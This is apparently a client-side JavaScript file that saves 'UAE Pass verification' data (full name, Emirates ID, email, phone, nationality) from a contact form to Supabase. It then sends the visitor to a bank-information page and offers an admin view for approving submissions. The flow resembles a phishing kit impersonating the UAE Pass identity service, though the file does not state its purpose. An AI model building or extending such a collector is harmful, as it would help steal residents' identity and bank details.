// ===== SUPABASE DATA MANAGEMENT FUNCTIONS =====
// This replaces localStorage with Supabase database storage

// Generate unique session ID
function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substring(2, 15);
}

// Get or create session ID (still uses sessionStorage for current browser session)
function getSessionId() {
    let sessionId = sessionStorage.getItem('verificationSessionId');
    if (!sessionId) {
        sessionId = generateSessionId();
        sessionStorage.setItem('verificationSessionId', sessionId);
    }
    return sessionId;
}

// Store UAE Pass verification data in Supabase
async function storeUAEPassData(data) {
    const supabase = window.getSupabaseClient();
    if (!supabase) {
        console.error('Supabase not initialized');
        return null;
    }

    const sessionId = getSessionId();
    
    const verificationData = {
        session_id: sessionId,
        uae_pass_data: data,
        status: 'pending_bank_info',
        timestamp: new Date().toISOString()
    };
    
    try {
        // Insert into Supabase
        const { data: insertedData, error } = await supabase
            .from('verifications')
            .insert([verificationData])
            .select();
        
        if (error) {
            console.error('Error storing UAE Pass data:', error);
            // Fallback to localStorage
            localStorage.setItem('verification_' + sessionId, JSON.stringify(verificationData));
            let allSubmissions = JSON.parse(localStorage.getItem('allSubmissions') || '[]');
            allSubmissions.push(verificationData);
            localStorage.setItem('allSubmissions', JSON.stringify(allSubmissions));
            return sessionId;
        }
        
        console.log('✅ UAE Pass data stored in Supabase:', insertedData);
        return sessionId;
        
    } catch (error) {
        console.error('Exception storing data:', error);
        // Fallback to localStorage
        localStorage.setItem('verification_' + sessionId, JSON.stringify(verificationData));
        return sessionId;
    }
}

// Get UAE Pass data for current session from Supabase
async function getUAEPassData() {
    const supabase = window.getSupabaseClient();
    if (!supabase) {
        console.error('Supabase not initialized');
        // Fallback to localStorage
        const sessionId = getSessionId();
        const dataStr = localStorage.getItem('verification_' + sessionId);
        return dataStr ? JSON.parse(dataStr) : null;
    }

    const sessionId = getSessionId();
    
    try {
        const { data, error } = await supabase
            .from('verifications')
            .select('*')
            .eq('session_id', sessionId)
            .single();
        
        if (error) {
            if (error.code === 'PGRST116') {
                // No rows found
                console.log('No verification found for session:', sessionId);
                return null;
            }
            console.error('Error fetching UAE Pass data:', error);
            // Fallback to localStorage
            const dataStr = localStorage.getItem('verification_' + sessionId);
            return dataStr ? JSON.parse(dataStr) : null;
        }
        
        return data;
        
    } catch (error) {
        console.error('Exception fetching data:', error);
        return null;
    }
}

// Update verification with bank information in Supabase
async function updateWithBankInfo(bankData) {
    const supabase = window.getSupabaseClient();
    if (!supabase) {
        console.error('Supabase not initialized');
        return false;
    }

    const sessionId = getSessionId();
    
    try {
        const { data, error } = await supabase
            .from('verifications')
            .update({
                bank_info: bankData,
                status: 'pending_approval',
                submitted_at: new Date().toISOString()
            })
            .eq('session_id', sessionId)
            .select();
        
        if (error) {
            console.error('Error updating bank info:', error);
            // Fallback to localStorage
            const dataStr = localStorage.getItem('verification_' + sessionId);
            if (dataStr) {
                const verificationData = JSON.parse(dataStr);
                verificationData.bank_info = bankData;
                verificationData.status = 'pending_approval';
                verificationData.submitted_at = new Date().toISOString();
                localStorage.setItem('verification_' + sessionId, JSON.stringify(verificationData));
                
                let allSubmissions = JSON.parse(localStorage.getItem('allSubmissions') || '[]');
                const index = allSubmissions.findIndex(s => s.session_id === sessionId);
                if (index !== -1) {
                    allSubmissions[index] = verificationData;
                    localStorage.setItem('allSubmissions', JSON.stringify(allSubmissions));
                }
            }
            return false;
        }
        
        console.log('✅ Bank info updated in Supabase:', data);
        return true;
        
    } catch (error) {
        console.error('Exception updating bank info:', error);
        return false;
    }
}

// Get all submissions (for admin dashboard)
async function getAllSubmissions() {
    const supabase = window.getSupabaseClient();
    if (!supabase) {
        console.error('Supabase not initialized');
        // Fallback to localStorage
        return JSON.parse(localStorage.getItem('allSubmissions') || '[]');
    }

    try {
        const { data, error } = await supabase
            .from('verifications')
            .select('*')
            .order('timestamp', { ascending: false });
        
        if (error) {
            console.error('Error fetching all submissions:', error);
            // Fallback to localStorage
            return JSON.parse(localStorage.getItem('allSubmissions') || '[]');
        }
        
        console.log(`✅ Fetched ${data.length} submissions from Supabase`);
        return data;
        
    } catch (error) {
        console.error('Exception fetching submissions:', error);
        return [];
    }
}

// Update verification status (admin approve/reject)
async function updateVerificationStatus(sessionId, status) {
    const supabase = window.getSupabaseClient();
    if (!supabase) {
        console.error('Supabase not initialized');
        return false;
    }

    const timestampField = status === 'approved' ? 'approved_at' : 'rejected_at';
    const updateData = {
        status: status,
        [timestampField]: new Date().toISOString()
    };

    try {
        const { data, error } = await supabase
            .from('verifications')
            .update(updateData)
            .eq('session_id', sessionId)
            .select();
        
        if (error) {
            console.error('Error updating status:', error);
            return false;
        }
        
        console.log(`✅ Status updated to ${status} in Supabase`);
        return true;
        
    } catch (error) {
        console.error('Exception updating status:', error);
        return false;
    }
}

// Get verification by session ID (for status checker)
async function getVerificationBySessionId(sessionId) {
    const supabase = window.getSupabaseClient();
    if (!supabase) {
        console.error('Supabase not initialized');
        // Fallback to localStorage
        const dataStr = localStorage.getItem('verification_' + sessionId);
        return dataStr ? JSON.parse(dataStr) : null;
    }

    try {
        const { data, error } = await supabase
            .from('verifications')
            .select('*')
            .eq('session_id', sessionId)
            .single();
        
        if (error) {
            if (error.code === 'PGRST116') {
                console.log('No verification found for session:', sessionId);
                return null;
            }
            console.error('Error fetching verification:', error);
            return null;
        }
        
        return data;
        
    } catch (error) {
        console.error('Exception fetching verification:', error);
        return null;
    }
}

// Make functions globally available
window.generateSessionId = generateSessionId;
window.getSessionId = getSessionId;
window.storeUAEPassData = storeUAEPassData;
window.getUAEPassData = getUAEPassData;
window.updateWithBankInfo = updateWithBankInfo;
window.getAllSubmissions = getAllSubmissions;
window.updateVerificationStatus = updateVerificationStatus;
window.getVerificationBySessionId = getVerificationBySessionId;

// Setup UAE Pass form submission handler
document.addEventListener('DOMContentLoaded', function() {
    // Initialize Supabase
    if (window.initializeSupabase) {
        window.initializeSupabase();
    }

    // Check if we're on UAE Pass verification page
    if (window.location.pathname.includes('uae-pass-verification')) {
        document.addEventListener('wpcf7mailsent', async function(event) {
            const formData = event.detail.inputs;
            const formDetails = {};
            formData.forEach(input => {
                formDetails[input.name] = input.value;
            });

            const uaeData = {
                fullName: formDetails['full-name'] || '',
                emiratesId: formDetails['emirates-id-field'] || '',
                email: formDetails['email'] || '',
                phone: formDetails['mobile-number-field'] || '',
                nationality: formDetails['countrytext-427'] || ''
            };
            
            const sessionId = await window.storeUAEPassData(uaeData);
            
            alert('Verification submitted successfully!\n\nYour Session ID: ' + sessionId + '\n\nPlease save this ID to check your status later.\n\nYou will now be redirected to complete your bank information.');
            
            setTimeout(function() {
                window.location.href = '../bank-information/index.html';
            }, 1000);
        }, false);
    }
});
